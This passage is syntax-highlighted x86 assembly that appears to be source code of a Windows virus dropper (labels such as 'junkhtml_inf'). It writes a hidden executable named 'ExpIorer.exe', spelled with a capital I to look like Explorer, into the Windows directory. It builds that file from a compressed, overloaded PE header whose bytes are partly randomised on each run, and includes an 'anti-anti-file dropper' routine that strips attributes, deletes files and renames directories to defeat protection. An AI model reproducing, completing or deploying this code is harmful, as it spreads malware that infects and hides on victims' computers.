        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">push_export</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">dispname</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ExpIorer"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">explabel</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ExpIorer.exe"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0d4h</span><span class="sc0">
</span><span class="sc1">;RLE-based compressed MZ header, PE header, import table, section table</span><span class="sc0">
</span><span class="sc1">;execution continues immediately after compressed data.  be careful ;)</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">11111111110000011100001011100000b</span><span class="sc0">
        </span><span class="sc1">;       mmmmmmmmmmz   01mmz   02mmm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"gdi32.dll"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000110000111100001001010010000b</span><span class="sc0">
        </span><span class="sc1">;       z   01mz   03mmz   02r   04m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000111110100100001001000111110b</span><span class="sc0">
        </span><span class="sc1">;       z   01mmmmr   02z   04mz   07mm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_exe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">junkhtml_exe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00001001010010001011000010100001b</span><span class="sc0">
        </span><span class="sc1">;       z   02r   04mz   05mz   02mz   02</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000110000101010111100001111100b</span><span class="sc0">
        </span><span class="sc1">;       z   01mz   02mr   07mz   03mmm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Arc"</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00001010000101000111100000101001b</span><span class="sc0">
        </span><span class="sc1">;       z   02mz   03mz   07mz   01r   02</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">((</span><span class="sc5">junkhtml_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1fffh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0fffh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">10000111000011100001110000110101b</span><span class="sc0">
        </span><span class="sc1">;       mz   03mz   03mz   03mz   03r  04</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">10001110101001100101001111001111b</span><span class="sc0">
        </span><span class="sc1">;       mz   07r   04mmz   0ar   0er   0e</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00010110000111000010100001101100b</span><span class="sc0">
        </span><span class="sc1">;       z   05mz   03mz   02mz   03r   08</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">junkhtml_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ffh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">1ffh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00011110000000000000000000000000b</span><span class="sc0">
        </span><span class="sc1">;       z   07m</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e0h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;decompressed data follow.  'X' bytes are set to random value every time</span><span class="sc0">
</span><span class="sc1">;       db      'M', 'Z'                ;00</span><span class="sc0">
</span><span class="sc1">;       db      "gdi32.dll", 0          ;02    align 4, filler (overload for dll name and import lookup table RVA)</span><span class="sc0">
</span><span class="sc1">;       db      'P', 'E', 0, 0          ;0c 00 signature (overload for date/time stamp)</span><span class="sc0">
</span><span class="sc1">;       dw      14ch                    ;10 04 machine (overload for forwarder chain)</span><span class="sc0">
</span><span class="sc1">;       dw      1                       ;12 06 number of sections (overload for forwarder chain)</span><span class="sc0">
</span><span class="sc1">;       dd      2                       ;14 08 date/time stamp (overload for dll name RVA)</span><span class="sc0">
</span><span class="sc1">;       dd      102ch                   ;18 0c pointer to symbol table (overload for import address table RVA)</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;1c 10 number of symbols</span><span class="sc0">
</span><span class="sc1">;       dw      88h                     ;20 14 size of optional header</span><span class="sc0">
</span><span class="sc1">;       dw      30fh                    ;22 16 characteristics</span><span class="sc0">
</span><span class="sc1">;       dw      10bh                    ;24 18 magic</span><span class="sc0">
</span><span class="sc1">;       db      X                       ;26 1a major linker</span><span class="sc0">
</span><span class="sc1">;       db      X                       ;27 1b minor linker</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;28 1c size of code (overload for import table terminator)</span><span class="sc0">
</span><span class="sc1">;       dd      56h                     ;2c 20 size of init data (overload for import name table RVA)</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;30 24 size of uninit data (overload for import name table terminator)</span><span class="sc0">
</span><span class="sc1">;       dd      offset junkhtml_exe - offset junkhtml_inf + expsize + 1000h</span><span class="sc0">
</span><span class="sc1">;                                       ;34 28 entry point</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;38 2c base of code</span><span class="sc0">
</span><span class="sc1">;       dd      0ch                     ;3c 30 base of data (overload for lfanew)</span><span class="sc0">
</span><span class="sc1">;       dd      400000h                 ;40 34 image base</span><span class="sc0">
</span><span class="sc1">;       dd      1000h                   ;44 38 section align</span><span class="sc0">
</span><span class="sc1">;       dd      200h                    ;48 3c file align</span><span class="sc0">
</span><span class="sc1">;       db      1, X                    ;4c 40 major os</span><span class="sc0">
</span><span class="sc1">;       db      X, X                    ;4e 42 minor os</span><span class="sc0">
</span><span class="sc1">;       db      X, X                    ;50 44 major image</span><span class="sc0">
</span><span class="sc1">;       db      X, X                    ;52 46 minor image</span><span class="sc0">
</span><span class="sc1">;       dw      4                       ;54 48 major subsys</span><span class="sc0">
</span><span class="sc1">;       dw      0                       ;56 4a minor subsys (overload for import name table)</span><span class="sc0">
</span><span class="sc1">;       db      "Arc", 0                ;58 4c reserved (overload for import name table)</span><span class="sc0">
</span><span class="sc1">;       dd      (aligned size of code)  ;5c 50 size of image</span><span class="sc0">
</span><span class="sc1">;       dd      expsize                 ;60 54 size of headers</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;64 58 checksum</span><span class="sc0">
</span><span class="sc1">;       dw      2                       ;68 5c subsystem</span><span class="sc0">
</span><span class="sc1">;       db      X, X                    ;6a 5e dll characteristics</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;6c 60 size of stack reserve</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;70 64 size of stack commit</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;74 68 size of heap reserve</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;78 6c size of heap commit</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;7c 70 loader flags</span><span class="sc0">
</span><span class="sc1">;       dd      2                       ;80 74 number of rva and sizes (ignored by Windows 9x/Me)</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;84 78 export</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;88 7c export</span><span class="sc0">
</span><span class="sc1">;       dd      1008h                   ;8c 80 import</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;90 84 import</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;94 88 resource</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;98 8c resource</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X, X, X, X, X  ;9c 90 exception</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X, X, X, X, X  ;a4 98 certificate</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X, X, X, X, X  ;ac a0 base reloc (overload for section name)</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;b4 a8 debug (overload for virtual size)</span><span class="sc0">
</span><span class="sc1">;       dd      1000h                   ;b8 ac debug (overload for virtual address)</span><span class="sc0">
</span><span class="sc1">;       dd      (aligned size of code)  ;bc b0 architecture (overload for file size)</span><span class="sc0">
</span><span class="sc1">;       dd      1                       ;c0 b4 architecture (overload for file offset)</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;c4 b8 global data (overload for pointer to relocs)</span><span class="sc0">
</span><span class="sc1">;       db      X, X, X, X              ;c8 bc global data (overload for pointer to line numbers)</span><span class="sc0">
</span><span class="sc1">;       dd      0                       ;cc c0 tls (overload for reloc table and line numbers)</span><span class="sc0">
</span><span class="sc1">;       dd      0e0000000h              ;d0 c4 tls (overload for section characteristics)</span><span class="sc0">
</span><span class="sc1">;                                       ;d4</span><span class="sc0">

</span><span class="sc5">drop_exp</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">explabel</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drop_exp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ffh</span><span class="sc0">
                                                </span><span class="sc1">;file size must be &gt; end of last section</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                        </span><span class="sc1">;GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GlobalFree</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;WriteFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;WriteFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;WriteFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0">           </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">                   </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">                   </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;MoveFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;MoveFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;SetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;SetFileAttributesA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;DeleteFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;GetTempFileNameA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;GetTempFileNameA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;GetTempFileNameA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GetTempFileNameA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;GetWindowsDirectoryA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GetWindowsDirectoryA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGetTempFileNameA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pDeleteFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">scas</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skip_slash</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;append exe name, assumes name is 0dh bytes long</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">skip_slash</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;anti-anti-file dropper - remove read-only attribute, delete file, rename directory</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pSetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skip_move</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pMoveFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">skip_move</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pCreateFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;WriteFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGetTickCount</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;decompress MZ header, PE header, section table, import table</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">copy_bytes</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
